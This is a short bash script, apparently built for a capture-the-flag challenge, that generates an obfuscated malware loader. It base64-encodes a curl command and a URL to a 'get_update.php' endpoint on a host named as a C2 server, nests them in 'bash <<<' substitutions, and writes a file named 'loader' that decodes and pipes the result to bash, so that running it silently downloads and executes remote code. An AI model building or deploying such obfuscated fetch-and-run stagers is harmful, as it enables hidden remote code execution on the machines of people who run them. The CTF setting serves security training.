outfile=loader

base_url="https://sup3r1337-c2-v12.chals.ctf.bsidespd.xyz/"

curlcmd='curl -s '
b64curl=$(echo -n "${curlcmd}" | base64)

version='djI%3D'  # =>testing
b64url=$(echo -n "${base_url}get_update.php?version=${version}" | base64 -w0)

runcurl_1='bash <<<"$(base64 -d <<<'
runcurl_2=') $(base64 -d <<<'
runcurl_3=')"'

runcurl="${runcurl_1}'${b64curl}'${runcurl_2}'${b64url}'${runcurl_3}"

prefix='bash <<<"$('
suffix=')"'

echo -n "${prefix}${runcurl}${suffix}"

b64script="$(echo -n "${prefix}${runcurl}${suffix}" | base64 -w0)"

echo "echo \"${b64script}\" | base64 -d | bash" > $outfile
